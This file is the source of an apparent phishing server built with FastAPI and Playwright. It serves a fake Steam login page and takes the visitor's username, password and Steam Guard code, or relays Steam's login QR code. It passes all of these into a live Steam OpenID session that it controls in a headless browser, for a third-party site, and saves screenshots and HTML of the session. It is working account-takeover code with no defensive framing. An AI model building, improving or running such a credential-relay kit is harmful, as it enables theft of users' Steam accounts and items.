import asyncio
import os
import base64
import time
from fastapi import FastAPI, Form, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from playwright.async_api import async_playwright
import uvicorn

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# Хранилище сессий: { sid: { page, last_qr, qr_active, ready } }
sessions = {}
SCREENSHOT_DIR = "debug_screens"
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

STEAM_LOGIN_URL = "https://steamcommunity.com/openid/login?openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.realm=https%3A%2F%2Fcs2run.app&openid.return_to=https%3A%2F%2Fcs2run.app%2Fauth%2F1%2Fstart-sign-in%2F%3FreturnUrl%3Dhttps%3A%2F%2Fcs2a.run%2Fauth"

async def save_debug_screen(page, name, sid):
    await asyncio.sleep(2)
    filename = f"{SCREENSHOT_DIR}/{sid}_{name}_{int(time.time())}.png"
    await page.screenshot(path=filename)
    print(f"[DEBUG] Screenshot saved: {filename}")

async def save_html(page, name, sid):
    html = await page.content()
    filename = f"{SCREENSHOT_DIR}/{sid}_{name}.html"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"[DEBUG] HTML saved: {filename}")
    
async def qr_updater_loop(sid):
    """Фоновая задача, которая делает скриншот QR раз в 15-20 секунд"""
    print(f"[LOOP] Запущен цикл обновления QR для {sid}")
    s = sessions[sid]
    page = s["page"]
    
    try:
        # Нажимаем кнопку один раз
        await page.click("text=Показать QR-код")
        await asyncio.sleep(2)
        
        clip = {"x": 105, "y": 547, "width": 190, "height": 194}
        
        while s.get("qr_active"):
            img_bytes = await page.screenshot(clip=clip)
            s["last_qr"] = base64.b64encode(img_bytes).decode()
            # Steam QR живет долго, обновлять раз в 15 сек — за глаза
            await asyncio.sleep(15) 
    except Exception as e:
        print(f"[LOOP ERROR] {e}")

async def init_browser(sid):
    if sid in sessions and sessions[sid].get("ready"):
        return
    try:
        pw = await async_playwright().start()
        # Запускаем браузер
        browser = await pw.chromium.launch(headless=True)
        
        # 1. ФИКС ЛОКАЛИЗАЦИИ: Указываем русский язык в настройках контекста
        context = await browser.new_context(
            viewport={"width": 400, "height": 800},
            locale='ru-RU', # Установка системной локали
            extra_http_headers={"Accept-Language": "ru-RU,ru;q=0.9"}, # Заголовок для сайта
            user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
        )
        
        page = await context.new_page()
        sessions[sid] = {"page": page, "browser": browser, "pw": pw, "ready": False, "last_qr": None}
        
        print(f"[INIT] Загрузка Steam для {sid}...")
        
        # Добавляем l=russian в URL еще раз для надежности
        await page.goto(STEAM_LOGIN_URL + "&l=russian")
        
        sessions[sid]["ready"] = True
    except Exception as e:
        print(f"[INIT ERROR] {e}")


@app.get("/", response_class=HTMLResponse)
async def index():
    return """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Steam Auth Polling</title>
        <style>
            body { background: #1b2838; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
            .box { background: #171a21; border-radius: 8px; padding: 20px; display: inline-block; width: 100%; max-width: 350px; }
            input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 4px; border: none; background: #32353c; color: white; }
            button { width: 96%; padding: 12px; margin: 5px 0; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
            .btn-blue { background: #66c0f4; color: white; }
            .btn-qr { background: #3a3a3a; color: #8f98a0; font-size: 12px; }
            .hidden { display: none; }
            #qr-display { width: 200px; height: 200px; margin: 15px auto; background: white; padding: 10px; border-radius: 4px; display: block; }
        </style>
    </head>
    <body onload="initSession()">
        <div class="box">
            <div id="login-box">
                <h3>Вход Steam</h3>
                <div id="credentials-fields">
                    <input type="text" id="u" placeholder="Логин">
                    <input type="password" id="p" placeholder="Пароль">
                    <button class="btn-blue" id="login-btn" onclick="sendLogin()">Войти</button>
                </div>
            
                <div id="qr-section">
                    <button class="btn-qr" id="qr-toggle" onclick="startQR()">Показать QR-код</button>
                    <div id="qr-container" class="hidden">
                        <img id="qr-display" src="" alt="Ожидание QR...">
                    </div>
                </div>
            
                <div id="guard-section" class="hidden">
                    <p style="font-size: 13px;">Введите код из приложения:</p>
                    <input type="text" id="guard-code" placeholder="G-XXXXX" maxlength="5" style="text-align: center; font-size: 20px;">
                    <button class="btn-blue" onclick="sendGuardCode()">Подтвердить</button>
                </div>
                
                <button class="btn-qr hidden" id="manual-code-btn" onclick="switchToManualCode()">Или введите код вручную</button>
            </div>
            <div id="status">Загрузка...</div>
        </div>

        <script>
        const sid = "sid_" + Date.now();
        let qrInterval = null;

        async function initSession() {
            await fetch(`/api/init?sid=${sid}`);
            document.getElementById('status').innerText = "Готов";
        }

        async function startQR() {
            document.getElementById('qr-container').classList.remove('hidden');
            document.getElementById('status').innerText = "Активация QR...";
            
            // Запускаем процесс на сервере
            await fetch(`/api/activate_qr?sid=${sid}`);
            
            // Начинаем опрос сервера (Polling) раз в 2 секунды
            if(!qrInterval) {
                qrInterval = setInterval(pollQR, 2000);
            }
        }

        async function pollQR() {
            try {
                const res = await fetch(`/api/get_qr?sid=${sid}`);
                const data = await res.json();
                if(data.status === 'ok' && data.qr) {
                    const img = document.getElementById('qr-display');
                    img.src = "data:image/png;base64," + data.qr;
                    document.getElementById('status').innerText = "QR обновлен: " + new Date().toLocaleTimeString();
                }
            } catch(e) { console.error("Polling error", e); }
        }

        async function sendLogin() {
            const status = document.getElementById('status');
            status.innerText = "Вход...";
            const params = new URLSearchParams({sid, u: document.getElementById('u').value, p: document.getElementById('p').value});
            const res = await fetch('/api/start', { method: 'POST', body: params });
            const data = await res.json();
            
            if(data.status === 'ok') {
                status.innerText = "Подтвердите вход";
                // Показываем кнопку "Ввести код вручную" и скрываем QR если был
                document.getElementById('manual-code-btn').classList.remove('hidden');
                document.getElementById('credentials-fields').classList.add('hidden');
            } else {
                status.innerText = data.msg;
            }
        }
        
        async function switchToManualCode() {
            clearInterval(qrInterval); // Останавливаем QR
            document.getElementById('qr-section').classList.add('hidden');
            document.getElementById('manual-code-btn').classList.add('hidden');
            document.getElementById('guard-section').classList.remove('hidden');
            document.getElementById('status').innerText = "Переключение на ввод кода...";
        
            const params = new URLSearchParams({sid});
            await fetch('/api/click_use_code', { method: 'POST', body: params });
            document.getElementById('status').innerText = "Введите код";
        }
        
        async function sendGuardCode() {
            const code = document.getElementById('guard-code').value;
            const params = new URLSearchParams({sid, code});
            const res = await fetch('/api/submit_guard', { method: 'POST', body: params });
            const data = await res.json();
            document.getElementById('status').innerText = data.status === 'ok' ? "Код отправлен!" : "Ошибка";
        }

        </script>
    </body>
    </html>
    """

@app.get("/api/init")
async def api_init(sid: str, bg: BackgroundTasks):
    bg.add_task(init_browser, sid)
    return {"status": "ok"}

@app.get("/api/activate_qr")
async def activate_qr(sid: str, bg: BackgroundTasks):
    if sid in sessions:
        sessions[sid]["qr_active"] = True
        bg.add_task(qr_updater_loop, sid)
        return {"status": "ok"}
    return {"status": "error"}


@app.get("/api/get_qr")
async def get_qr(sid: str):
    if sid in sessions and sessions[sid]["last_qr"]:
        return {"status": "ok", "qr": sessions[sid]["last_qr"]}
    return {"status": "loading"}

@app.post("/api/start")
async def api_start(sid: str = Form(...), u: str = Form(...), p: str = Form(...)):
    if sid not in sessions: return {"status": "error", "msg": "Сессия не найдена"}
    s = sessions[sid]
    while not s.get("ready"): await asyncio.sleep(0.5)
    page = s["page"]
    
    try:
        await page.fill("input[type='text']", u)
        await page.fill("input[type='password']", p)
        await page.click("button[type='submit'], .DjSvCZoKKfoNSmarsEcTS")
        
        result = None
        for _ in range(15):
            await asyncio.sleep(0.8)
            error_el = await page.query_selector("._1W_6HXiG4JJ0By1qN_0fGZ")
            if error_el and await error_el.is_visible():
                result = {"status": "error", "msg": "Неверный логин или пароль"}
                break
            
            guard_input = await page.query_selector("input#twofactorcode_entry, input#authcode")
            if guard_input:
                await save_html(page, "guard_page", sid)
                result = {"status": "ok"}
                break
        
        await save_debug_screen(page, "after_login", sid)
        return result or {"status": "error", "msg": "Steam не ответил"}
    except Exception as e: return {"status": "error", "msg": str(e)}

@app.post("/api/click_use_code")
async def click_use_code(sid: str = Form(...)):
    if sid not in sessions:
        return {"status": "error", "msg": "Сессия не найдена"}
    
    s = sessions[sid]
    page = s["page"]
    
    try:
        # Останавливаем цикл обновления QR, если он запущен
        s["qr_active"] = False
        
        # Кликаем по кнопке с текстом "введите код" (регистр не важен в Playwright)
        # В Steam это обычно ссылка или кнопка
        print(f"[ACTION] Нажимаем 'ввести код' для {sid}")
        await page.click("text=введите код вручную", timeout=5000) 
        # Если текст другой, можно попробовать: await page.click("text=введите код")
        
        # Скриншот сразу после клика
        await save_debug_screen(page, "after_click_manual_code", sid)
        
        # Ждем 5 секунд и сохраняем HTML
        await asyncio.sleep(5)
        await save_html(page, "manual_code_page_final", sid)
        
        return {"status": "ok"}
    except Exception as e:
        print(f"[CLICK ERROR] {e}")
        # Если не нашли по тексту, попробуем сделать скриншот ошибки для отладки
        await save_debug_screen(page, "click_error", sid)
        return {"status": "error", "msg": str(e)}

@app.post("/api/submit_guard")
async def submit_guard(sid: str = Form(...), code: str = Form(...)):
    if sid not in sessions: return {"status": "error"}
    page = sessions[sid]["page"]
    try:
        # Заполняем поле кода. Обычно это input с id 'authcode' или 'twofactorcode_entry'
        # Судя по вашему логу, мы его искали в api_start
        await page.fill("input#twofactorcode_entry, input#authcode", code)
        await page.press("input#twofactorcode_entry, input#authcode", "Enter")
        
        await asyncio.sleep(3)
        await save_debug_screen(page, "after_guard_submit", sid)
        return {"status": "ok"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5050)
